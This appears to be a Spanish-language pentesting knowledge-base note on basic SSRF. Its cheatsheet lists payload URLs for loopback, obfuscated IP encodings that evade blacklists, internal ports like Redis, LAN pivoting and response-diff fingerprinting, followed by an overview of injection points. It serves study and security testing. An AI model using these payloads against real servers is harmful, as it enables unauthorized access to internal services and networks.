---
aliases:
  - Basic SSRF
  - SSRF In-Band
tags:
  - type/technique
  - vuln/ssrf
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[Server-Side Request Forgery (SSRF)]]'
---
# SSRF - Básico

***

## Cheatsheet

|        **Vector**        |                                       **Payload**                                        | **Notas**                                                                     |
| :----------------------: | :--------------------------------------------------------------------------------------: | ----------------------------------------------------------------------------- |
|   **Loopback directo**   |                                 `http://127.0.0.1/admin`                                 | Target clásico — servicios internos bindeados a localhost.                    |
|   **Hostname alterno**   |                 `http://localhost/`, `http://0.0.0.0/`, `http://[::1]/`                  | Bypass de blacklists simples de `127.0.0.1`.                                  |
| **IP en formatos raros** | `http://2130706433/` (decimal), `http://0x7f000001/` (hex), `http://0177.0.0.1/` (octal) | Evade regex estrictos que solo matchean dotted-quad.                          |
| **Puertos arbitrarios**  |            `http://127.0.0.1:6379/` (Redis), `http://127.0.0.1:8080/actuator`            | Enum servicios internos.                                                      |
|     **LAN interna**      |                        `http://192.168.1.1/`, `http://10.0.0.1/`                         | Pivot desde server a red interna.                                             |
|  **Reflexión de error**  |               `http://internal-only/existe` vs `http://internal-only/404`                | Fingerprinting por response diff cuando servicio interno no responde con 200. |
^ssrf-basico

___

## Overview

SSRF **básico** (in-band) es el vector más directo: el atacante controla una URL que el servidor backend consume (descarga, fetch, proxy), y la respuesta del server interno vuelve al atacante en el cuerpo HTTP.

Vectores típicos de inyección:
- Funcionalidad "import URL" / "fetch image from URL".
- Webhooks.
- Previews de links (generación automática de OG metadata).
- PDF renderers que embeben imágenes remotas.
- XML parsers con external entities (XXE → SSRF).

### Mecanismos de Acción

- **Loopback hit**: backend resuelve `127.0.0.1` a su propia red interna → acceso a servicios management bindeados solo a localhost (admin panels, Redis, MongoDB sin auth).
- **LAN pivot**: si backend corre en `10.0.0.50`, `http://10.0.0.1/` le alcanza cualquier otra IP en su subnet — típicamente inaccesible desde internet.
- **Port scanning**: diferencias en response (timing, body, status code) permiten mapear qué puertos están abiertos en un host interno.
- **Cloud metadata**: redirect a endpoints especiales (`169.254.169.254`) — ver [[SSRF - Cloud Metadata]].

***
